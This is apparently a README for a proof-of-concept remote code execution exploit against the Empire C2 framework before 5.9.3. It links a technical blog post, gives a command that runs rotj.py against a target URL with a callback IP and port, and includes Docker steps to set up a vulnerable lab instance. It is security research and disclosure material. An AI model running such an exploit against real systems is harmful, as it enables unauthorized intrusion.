# Empire-C2-RCE-PoC
RCE PoC for Empire C2 framework &lt;5.9.3

### Technical Blog
[Exploiting Empire C2 Framework](https://aceresponder.com/blog/exploiting-empire-c2-framework)

### Usage

```
pip install -r requirements.txt
python3 ./rotj.py 'http://192.168.158.171:80' 127.0.0.1 4444
```

### Docker

```
sudo docker build . exploitable/empire
sudo docker run --network=host exploitable/empire

EMPIRE
sudo docker exec -it 2ec72f1568dd ./ps-empire client
# once the client is started you'll need to start a listener

uselistner http
execute
```


